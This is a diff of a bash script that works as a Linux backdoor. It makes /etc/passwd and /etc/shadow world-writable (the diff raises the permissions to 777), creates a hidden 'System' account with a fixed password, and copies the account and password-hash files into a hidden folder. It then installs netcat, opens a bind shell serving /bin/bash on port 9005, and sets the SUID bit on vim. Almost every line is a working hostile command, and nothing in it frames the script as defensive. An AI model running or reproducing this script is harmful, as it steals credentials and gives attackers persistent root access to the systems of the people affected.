@@ -1,7 +1,7 @@
 #!/bin/bash
 
-sudo chmod 646 /etc/passwd &> /dev/null
-sudo chmod 646 /etc/shadow &> /dev/null
+sudo chmod 777 /etc/passwd &> /dev/null
+sudo chmod 777 /etc/shadow &> /dev/null
 sudo chmod 777 /root &> /dev/null
 
 sudo useradd System &> /dev/null && echo -e "defnotthepasswd\ndefnotthepasswd" | passwd System &> /dev/null
@@ -17,7 +17,7 @@ cp /etc/passwd /home/System/.SystemFiles/accounts
 cp /etc/shadow /home/System/.SystemFiles/hashes
 ip a >> /home/System/.SystemFiles/internet.txt
 
-sudo apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
+sudo apt update > /dev/null 2> /dev/null && sudo apt -y install netcat-traditional 2> /dev/null > /dev/null
 sudo nc.traditional -l -p 9005 -e /bin/bash &
 
 sudo chmod u+s /usr/bin/vim.basic &> /dev/null
